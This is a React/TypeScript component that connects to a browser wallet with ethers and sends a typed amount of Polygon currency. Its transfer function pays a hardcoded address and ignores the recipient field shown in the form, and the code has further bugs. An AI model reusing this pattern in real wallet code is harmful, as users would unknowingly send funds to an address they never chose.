import { useState, useEffect } from 'react'
import { connect } from './connect';
import { ethers } from 'ethers'

declare let window: {
    ethereum: ethers.providers.ExternalProvider
}

export function Polygon() {

    const [address, setAddress] = useState<string>('');
    const [errorConnectingToProvider, setErrorConnectingToProvider] = useState<{ error: unknown }>();
    const [inputValue, setInputValue] = useState<string>("")
    const [inputAddress, setInputAddress] = useState<string>("")

    useEffect(() => {
        connectToProvider();
        async function connectToProvider() {
            const address = await connect();
            if (typeof address === 'string') {
                setAddress(address);
            } else {
                setErrorConnectingToProvider(address);
            }
        }
    }, []);

    async function transfer() {
        try {
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const send_account = await provider.getSigner().getAddress();
            const currentGasPrice = await provider.getGasPrice();
            const gas_price = ethers.utils.hexlify(
                parseInt(currentGasPrice.toString()),
            );
            const transaction = {
                from: send_account,
                to: '0xb11D554F2139d843F5c94a3185d17C4d5762a7c7',
                value: ethers.utils.parseEther(inputValue),
                nonce: provider.getTransactionCount(send_account, 'latest'),
                gasLimit: ethers.utils.hexlify(100000),
                gasPrice: gas_price,
            }
            const hash = await provider.getSigner().sendTransaction(transaction);
            const receipt = await hash.wait();
            return { hash: receipt.transactionHash };
        } catch (error) {
            return {
                error: (error as any).message,
            };
        }
    }

    return (
        <div>
            <h1>Account selected address: {address}</h1>
            <form>
                <input type="text" onChange={(event) => setInputValue(event.target.value)} value={inputValue} />
                <input type="number" onChange={(event) => setInputAddress(event.target.value)} value={inputAddress} />
                <button onClick={transfer}>Send</button>
            </form>
        </div>
    );
}

export default Polygon;